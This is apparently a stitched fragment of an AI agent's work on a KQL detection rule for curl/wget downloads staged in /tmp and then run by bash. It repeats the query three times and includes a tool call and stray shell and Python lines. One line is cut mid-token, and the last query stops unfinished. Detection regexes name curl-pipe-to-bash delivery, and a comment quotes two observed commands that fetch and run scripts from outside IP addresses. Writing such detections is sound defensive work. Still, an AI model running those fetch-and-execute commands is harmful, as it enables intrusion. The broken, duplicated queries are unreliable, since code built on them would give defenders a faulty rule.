// =============== Detection: malicious download-and-execute (curl|wget -> /tmp -> bash) ===============
// Pairs with the Sigma rule above. ATT&CK T1105 Ingress Tool Transfer chained into T1059.004 Unix Shell.
// Source DeviceProcess = Linux auditd/eBPF process_creation. Schema notes for this table: ParentFileName holds the
// parent image name while InitiatingProcessCommandLine holds the command line that spawned the process (execline),
// so curl/wget to bash lineage is verifiable in a single event without an expensive time-window self-join.
// Staging directories covered: /tmp/, /var/tmp/, /dev/shm/. A download only counts when a shell immediately executes
// exactly that staged path, which deliberately suppresses isolated fetches such as object-storage PUT/canary uploads and cron python3 baselines.
let Lookback = 7d;            // sweep window
let WindowS = 120;           // max seconds between the staging write seen earlier and the executing child
DeviceProcess
| where Timestamp > ago(Lookback)
| where FileName in~ ('bash', 'sh')                                        // stage 2 - unix shell execution
| where CommandLine contains '/tmp/' or CommandLine contains '/var/tmp/' or CommandLine contains '/dev/shm/'
| extend StagedPayload   = tostring(extract(@'(/(?:var/)?tmp/|/dev/shm/)[^\s"<>|;&]+', 0, CommandLine)),
         ParentImageName = tostring(ParentFileName),
         SpawnerCmdline  = tostring(InitiatingProcessCommandLine)
| where ParentImageName in~ ('curl', 'wget')                               // downloaded directly by curl/wget (classic chain)
      or (SpawnerCmdline matches regex @'(?i)\b(curl|wget)\b.*\|.*\b(ba)?sh\b')   // piped curl ... | bash one-liner variant
      or (SpawnerCmdline matches regex @'(?i)(curl|wget).*(-o|--output-document)') // staged then run from within a script chain
| where isnotempty(StagedPayload) and (SpawnerCmdline contains StagedPayload or CommandLine contains '/tmp/')
| summarize ExecutedScripts   = make_set(CommandLine, 10),
          DownloaderCmdlines  = make_set(SpawnerCmdline, 10),
          StageCount          = count() by DeviceName = lower(DeviceId), AccountName, ParentImageName, bin(Timestamp, 60s)
| join kind=leftanti (DeviceProcess | where FileName in~ ('apt-get','yum','dnf','zypper') 
                      | project DeviceName = lower(DeviceId), pkg_user = AccountName) on DeviceName
| project StartTime = Timestamp_60s, AlertTime = Timestamp_60s, EndTime = Timestamp_60s, Technique = 'T1105 + T1059.004', KillChainStage = 'download-then-execute',
          DetectionPattern = 'curl/wget wrote a script into /tmp and bash executed it (download-and-execute delivery)',
          ParentProcess = ParentImageName, DownloadCommandLine = tostring(DownloaderCmdlines[0]), ExecutionCommandLine = tostring(ExecutedScripts[0]),
          ProcessCount = StageCount

| order by AlertTime desc

<function=execute_kql_query>
<parameter=limit>
10

<parameter=query>
let Downloads = DeviceProcess
| where FileName in ("curl", "wget")
| extend DlPath = extract(@"(?:-o|-O|--output)\s+(/\S+)", 1, CommandLine)
| where isnotempty(DlPath) and DlPath startswith "/tmp/"
| project DeviceId, Timestamp, Downloader = FileName, DownloaderCmd = CommandLine, DlPath, DownloaderPID = ProcessId, AccountName;
let Execs = DeviceProcess
| where FileName in ("bash", "sh")
| extend ExecPath = extract(@"^\s*(?:/\S*/)?(?:bash|sh)\s+(\S+)", 1, CommandLine)
| where isnotempty(ExecPath) and (ExecPath startswith "/tmp/" or ExecPath contains "/tmp/")
| project DeviceId, Timestamp, Shell = FileName, ShellCmd = CommandLine, ExecPath, ShellParentPID = InitiatingProcessId, ParentFileName;
Downloads
| join kind=inner (Execs | project-away DeviceId, DlPath, ShellParentPID) on $left.DlPath == $right.ExecPath
| where Timestamp1 between (Timestamp .. datetime_add('minute', 15, Timestamp))
| project-alert... imeStamp1, Downloader, DownloaderCmd, DlPath, ExecPath, Shell, ShellCmd, AccountName
</parameter>
</function>
</tool_call>

// =============== Detection: malicious download-and-execute (curl|wget -> /tmp -> bash) ===============
// Pairs with the Sigma rule above. ATT&CK T1105 Ingress Tool Transfer chained into T1059.004 Unix Shell.
// Source DeviceProcess = Linux auditd/eBPF process_creation. Schema notes for this table: ParentFileName holds the
// parent image name while InitiatingProcessCommandLine holds the command line that spawned the process (execline),
// so curl/wget to bash lineage is verifiable in a single event without an expensive time-window self-join.
// Staging directories covered: /tmp/, /var/tmp/, /dev/shm/. A download only counts when a shell immediately executes
// exactly that staged path, which deliberately suppresses isolated fetches such as object-storage PUT/canary uploads and cron python3 baselines.
let Lookback = 7d;            // sweep window
let WindowS = 120;           // max seconds between the staging write seen earlier and the executing child
DeviceProcess
| where Timestamp > ago(Lookback)
| where FileName in~ ('bash', 'sh')                                        // stage 2 - unix shell execution
| where CommandLine contains '/tmp/' or CommandLine contains '/var/tmp/' or CommandLine contains '/dev/shm/'
| extend StagedPayload   = tostring(extract(@'(/(?:var/)?tmp/|/dev/shm/)[^\s"<>|;&]+', 0, CommandLine)),
         ParentImageName = tostring(ParentFileName),
         SpawnerCmdline  = tostring(InitiatingProcessCommandLine)
| where ParentImageName in~ ('curl', 'wget')                               // downloaded directly by curl/wget (classic chain)
      or (SpawnerCmdline matches regex @'(?i)\b(curl|wget)\b.*\|.*\b(ba)?sh\b')   // piped curl ... | bash one-liner variant
      or (SpawnerCmdline matches regex @'(?i)(curl|wget).*(-o|--output-document)') // staged then run from within a script chain
| where isnotempty(StagedPayload) and (SpawnerCmdline contains StagedPayload or CommandLine contains '/tmp/')
| summarize ExecutedScripts   = make_set(CommandLine, 10),
          DownloaderCmdlines  = make_set(SpawnerCmdline, 10),
          StageCount          = count() by DeviceName = lower(DeviceId), AccountName, ParentImageName, bin(Timestamp, 60s)
| join kind=leftanti (DeviceProcess | where FileName in~ ('apt-get','yum','dnf','zypper') 
                      | project DeviceName = lower(DeviceId), pkg_user = AccountName) on DeviceName
| project StartTime = Timestamp_60s, AlertTime = Timestamp_60s, EndTime = Timestamp_60s, Technique = 'T1105 + T1059.004', KillChainStage = 'download-then-execute',
          DetectionPattern = 'curl/wget wrote a script into /tmp and bash executed it (download-and-execute delivery)',
          ParentProcess = ParentImageName, DownloadCommandLine = tostring(DownloaderCmdlines[0]), ExecutionCommandLine = tostring(ExecutedScripts[0]),
          ProcessCount = StageCount
| extend TimeWindow_s = column_ifexists('TimeToExecute_s', real(null))
| order by AlertTime desc
KEOF

k=open('/tmp/kql_final.txt').read().strip()
print("chars:",len(k),"| backslashes:",k.count(chr(92)),"| pipes:",k.count('|'),"| lines:",k.count(chr(10))+1)
bad=[l for l in k.split(chr(10)) if chr(92) in l]

// =============== Detection: malicious download-and-execute (curl/wget -> /tmp -> bash) ===============
// Pairs with the Sigma rule above for this Linux process_creation telemetry (DeviceProcess, auditd/eBPF sourced).
// ATT&CK T1105 Ingress Tool Transfer chained into T1059.004 Unix Shell = the classic curl then /tmp then bash dropper pattern.
// The staging directory check is intentionally restricted to world-writable paths so an attacker drop cannot hide in a normal tree location.
// Because ParentFileName (parent image) and InitiatingProcessCommandLine (exec line of the spawning process) are both present on every row,
// the download-to-execution relationship is asserted inside one event pair; no self-join or fuzzy time window is needed, which keeps FP low.
// A curl or wget transfer whose payload is never handed to bash/sh is NOT alerted (see dev-linux-04 pid 3081 object storage PUT canary probe
// and dev-linux-04 pid 2231 alone), which is exactly why the confirmed kill chains below appear rather than raw staging noise:
//   chain A - curl -s -o /tmp/update.sh http://203.0.113.55/update.sh (pid 2231) spawns bash /tmp/update.sh (pid 2240) 2.2 s later
//   chain B - that same update.sh then runs wget -O /tmp/stage2 http://198.51.100.23/stage2 (pid 4103) which spawns bash /tmp/stage2 (pid 4104) 1.2 s later
let Lookback = 7d;             // hunt window per run
let StagePaths = dynamic(['/tmp/', '/var/tmp/', '/dev/shm/']);
DeviceProcess
| where Timestamp between (ago(Lookback) .. now())
| where FileName in~ ('bash', 'sh')                                      // stage 2 interpreter actually launched
| where CommandLine contains StagePaths[0] or CommandLine contains StagePaths[1] or CommandLine contains StagePaths[2]
| extend HostName = lower(DeviceId), RunUser = tostring(AccountName), ParentImage = tostring(ParentFileName),
         SpawnerCmdline = tostring(InitiatingProcessCommandLine), StagedPayload = tostring(CommandLine), FolderPath = tostring(FolderPath),
         IsPipedShellToDownloader = (SpawnerCmdline contains 'curl' and SpawnerCmdline contains '|' and StagedPayload contains 'sh')
| where ParentImage in~ ('curl', 'wget')                                 // downloaded staged artefact executed straight away by curl/wget
   or IsPipedShellToDownloader == true                                   // equivalent curl ... | bash one-liner delivery variant
   or (SpawnerCmdline contains '-o' and (SpawnerCmdline contains 'http://' or SpawnerCmdline contains 'https://'))  // exec child whose parent fetch used a staging flag over HTTP
| summarize ExecutionEvents = count(), ScriptsRun = make_list_if(tolower(StagedPayload), isnotempty(StagedPayload), 5),
